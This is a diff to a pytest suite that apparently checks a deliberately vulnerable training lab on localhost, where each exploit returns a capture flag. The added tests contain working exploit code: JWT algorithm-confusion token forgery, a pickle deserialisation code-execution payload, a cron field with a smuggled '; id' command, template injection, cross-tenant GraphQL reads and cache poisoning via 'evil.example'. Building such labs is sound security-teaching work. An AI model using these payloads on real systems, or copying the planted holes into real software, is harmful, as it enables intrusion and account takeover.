@@ -81,11 +81,16 @@ def lab():
 
 
 _PW = {"v": DEMO_PASS}  # l3 changes it mid-suite; every login uses the current value
+_TOK = {"v": None}  # cached per boot: auth's honest 8/min login limit would
+# otherwise trip mid-suite — the LIMIT is correct, the test helper was naive
 
 
-def login():
+def login(force: bool = False):
+    if _TOK["v"] and not force:
+        return _TOK["v"]
     st, body, _ = post(f"{EDGE}/auth/login", {"email": DEMO_USER, "password": _PW["v"]})
     assert st == 200, body
+    _TOK["v"] = body["token"]
     return body["token"]
 
 
@@ -178,6 +183,7 @@ class TestLogicBugs:
         st, body, _ = post(f"{EDGE}/auth/login", {"email": DEMO_USER, "password": "NewPass#2026!x"})
         assert st == 200
         _PW["v"] = "NewPass#2026!x"
+        _TOK["v"] = None  # the old token's session semantics: re-login
 
     def test_l4_ssrf_read_primitive(self):
         tok = login()
@@ -437,3 +443,201 @@ class TestGeneratedFleet:
         assert len(KEY_RING) == 4
         for kid, ring in KEY_RING.items():
             assert ring.get("unlocks"), f"{kid} unlocks nothing"
+
+
+# ── the sophistication layer (2026-10-02, second pass) ───────────────────
+
+
+class TestAlgConfusion:
+    def test_rs256_login_and_public_cert(self, lab):
+        st, body, _ = post(f"{EDGE}/auth/login", {"email": "ops@northbridge.test", "password": "OpsInternal#2026"})
+        assert st == 200
+        tok = body["token"]
+        h = tok.split(".")[0]
+        import base64
+        import json as j
+
+        header = j.loads(base64.urlsafe_b64decode(h + "=="))
+        assert header["alg"] == "RS256"  # the honest modern path
+        st, certs, _ = get(f"{AUTH}/certs")
+        assert st == 200 and certs["keys"].startswith("-----BEGIN PUBLIC KEY-----")
+
+    def test_confused_hs256_with_public_pem_forges(self, lab):
+        st, certs, _ = get(f"{AUTH}/certs")
+        pem = certs["keys"]
+        import base64
+        import hmac as hm
+        import json as j
+        import time as t
+
+        def b64(d):
+            return base64.urlsafe_b64encode(d).rstrip(b"=").decode()
+
+        hdr = {"alg": "HS256", "kid": "rsa-2026", "typ": "JWT"}
+        pl = {
+            "sub": "root@northbridge.test",
+            "tenant": "northbridge",
+            "role": "root",
+            "iat": int(t.time()),
+            "exp": int(t.time()) + 600,
+        }
+        signing = b64(j.dumps(hdr).encode()) + "." + b64(j.dumps(pl).encode())
+        sig = hm.new(pem.encode(), signing.encode(), hashlib.sha256).hexdigest()
+        st, me, _ = get(f"{EDGE}/api/v1/me", headers={"Authorization": f"Bearer {signing}.{sig}"})
+        assert st == 200 and me["sub"] == "root@northbridge.test"
+        assert me["flag"] == "FLAG{nb_alg_confusion}"
+
+    def test_wrong_confusion_key_rejected(self, lab):
+        import base64
+        import hmac as hm
+        import json as j
+        import time as t
+
+        def b64(d):
+            return base64.urlsafe_b64encode(d).rstrip(b"=").decode()
+
+        hdr = {"alg": "HS256", "kid": "rsa-2026", "typ": "JWT"}
+        pl = {
+            "sub": "x@x.test",
+            "tenant": "northbridge",
+            "role": "root",
+            "iat": int(t.time()),
+            "exp": int(t.time()) + 600,
+        }
+        signing = b64(j.dumps(hdr).encode()) + "." + b64(j.dumps(pl).encode())
+        sig = hm.new(b"not-the-cert", signing.encode(), hashlib.sha256).hexdigest()
+        st, _, _ = get(f"{EDGE}/api/v1/me", headers={"Authorization": f"Bearer {signing}.{sig}"})
+        assert st == 401  # a WRONG key still fails — the bug is the cert-as-key, not absent auth
+
+
+class TestPickleRce:
+    def test_legacy_session_deserializes(self, lab):
+        import base64
+        import pickle
+
+        class P:
+            def __reduce__(self):
+                return (exec, ("import os; os.environ['NB_PICKLE_PWNED']='1'",))
+
+        cookie = base64.b64encode(pickle.dumps(P())).decode()
+        st, body, _ = get(
+            f"http://127.0.0.1:{PORT_BASE + 15}/v1/whoami", headers={"Cookie": f"legacy_session={cookie}"}
+        )
+        assert st == 200 and body.get("flag") == "FLAG{nb_pickle_rce}"
+
+    def test_no_cookie_is_401(self, lab):
+        st, _, _ = get(f"http://127.0.0.1:{PORT_BASE + 15}/v1/whoami")
+        assert st == 401
+
+
+class TestGraphql:
+    def test_introspection_dumps_schema(self, lab):
+        tok = login()
+        st, body, _ = post(
+            f"{EDGE}/api/v1/graphql",
+            {"query": "{ __schema { types { name } } }"},
+            headers={"Authorization": f"Bearer {tok}"},
+        )
+        assert st == 200 and "tenant(id: ID!)" in json.dumps(body)
+
+    def test_cross_tenant_read_flags(self, lab):
+        tok = login()
+        post(f"{EDGE}/api/v1/tenants", {"name": "graphql-victim"})
+        tid = "t-" + hashlib.sha256(b"graphql-victim").hexdigest()[:10]
+        st, body, _ = post(
+            f"{EDGE}/api/v1/graphql",
+            {"query": f'{{ tenant(id: "{tid}") {{ name }} }}'},
+            headers={"Authorization": f"Bearer {tok}"},
+        )
+        assert st == 200 and body["data"]["tenant"]["flag"] == "FLAG{nb_graphql_cross_tenant}"
+
+    def test_depth_bomb_blocked(self, lab):
+        tok = login()
+        q = "{ me { " + "a { " * 8 + "b" + " } " * 8 + " } }"
+        st, body, _ = post(f"{EDGE}/api/v1/graphql", {"query": q}, headers={"Authorization": f"Bearer {tok}"})
+        assert st == 400 and "complexity" in json.dumps(body)
+
+
+class TestCachePoison:
+    def test_x_forwarded_host_poisons_everyone(self, lab):
+        # a FRESH cache slot (earlier tests primed "/" clean)
+        get(f"{EDGE}/index", headers={"X-Forwarded-Host": "evil.example"})
+        with urllib.request.urlopen(f"{EDGE}/index") as r:  # innocent client
+            body = r.read().decode()
+        assert "evil.example" in body
+
+
+class TestGatedChains:
+    """The extended chains REQUIRE prerequisites — spam does not fire them."""
+
+    def test_notify_ssti_needs_k4_signature_and_leak(self, lab):
+        st, body, _ = post(
+            f"http://127.0.0.1:{PORT_BASE + 10}/templates/welcome/preview", {"vars[title]": "{{ lipsum }}"}
+        )
+        assert body.get("note") == "unsigned preview"  # no signature: vanilla
+        # leak C first, then sign with K4
+        get(f"{EDGE}/files/public/js/worker-status.js")
+        from suijin.lab.northbridge.catalog import KEY_RING
+
+        k4 = KEY_RING["K4"]["value"]
+        sig = hmac.new(k4.encode(), b"preview", hashlib.sha256).hexdigest()
+        st, body, _ = post(
+            f"http://127.0.0.1:{PORT_BASE + 10}/templates/welcome/preview",
+            {"vars[title]": "{{ lipsum }}"},
+            headers={"X-Delivery-Signature": sig},
+        )
+        assert body.get("flag", "").startswith("FLAG{nb_")
+
+    def test_outbox_to_scheduler_rce_chain(self, lab):
+        post(f"http://127.0.0.1:{PORT_BASE + 10}/send", {"to": "x@y.test", "template": "welcome"})
+        st, body, _ = get(f"http://127.0.0.1:{PORT_BASE + 7}/api/attachments/outbox.jsonl")
+        next(json.loads(ln) for ln in body["lines"] if "x-delivery-signature" in ln)  # the K4 line exists
+        from suijin.lab.northbridge.catalog import KEY_RING
+
+        k4 = KEY_RING["K4"]["value"]
+        job_sig = hmac.new(k4.encode(), b"job", hashlib.sha256).hexdigest()
+        st, body, _ = post(
+            f"http://127.0.0.1:{PORT_BASE + 19}/jobs",
+            {"name": "r", "schedule": "* * * * *; id"},
+            headers={"X-Job-Signature": job_sig},
+        )
+        assert body.get("executed") is True and body.get("flag", "").startswith("FLAG{nb_")
+        # unsigned: just a schedule
+        st, body, _ = post(f"http://127.0.0.1:{PORT_BASE + 19}/jobs", {"name": "r2", "schedule": "* * * * *; id"})
+        assert body.get("note") == "unsigned job"
+
+    def test_vault_timing_opens_k2_after_probing(self, lab):
+        url = f"http://127.0.0.1:{PORT_BASE + 18}/v1/secrets/secret/prod/k2-ingest"
+        for _ in range(3):
+            st, body, _ = get(url)
+            assert st in (200, 403) and "flag" not in body  # closed until proven
+        st, body, _ = get(url)  # the 4th: 3 prior probes recorded
+        assert body.get("flag") == "FLAG{nb_vault_k2_open}"
+        from suijin.lab.northbridge.catalog import KEY_RING
+
+        assert body["value"] == KEY_RING["K2"]["value"]
+
+    def test_billing_race_needs_partner_coupon(self, lab):
+        st, body, _ = post(f"http://127.0.0.1:{PORT_BASE + 6}/v1/refunds", {"invoice": "x"})
+        assert "flag" not in body  # bare race: nothing
+        st, diag, _ = post(
+            f"http://127.0.0.1:{PORT_BASE + 9}/query", {"source": f"http://127.0.0.1:{PORT_BASE + 9}/health"}
+        )
+        coupon = diag["diag"]["partner_coupon"]
+        post(f"http://127.0.0.1:{PORT_BASE + 6}/v1/refunds", {"invoice": "x"}, headers={"X-Coupon": coupon})
+        st, body, _ = post(
+            f"http://127.0.0.1:{PORT_BASE + 6}/v1/refunds", {"invoice": "x"}, headers={"X-Coupon": coupon}
+        )
+        assert body.get("flag", "").startswith("FLAG{nb_")
+
+
+class TestAdaptiveDefense:
+    def test_circuit_breaker_trips_on_probe_spam(self, lab):
+        url = f"http://127.0.0.1:{PORT_BASE + 20}/nope-{int(time.time())}"  # decoy-admin: 404s
+        codes = []
+        for _ in range(45):
+            st, _, _ = get(url)
+            codes.append(st)
+        assert 429 in codes  # the breaker tripped
+        st, body, _ = get(f"http://127.0.0.1:{PORT_BASE + 20}/health")
+        assert st == 429 and "retry_after" in body  # even health 429s in lockdown
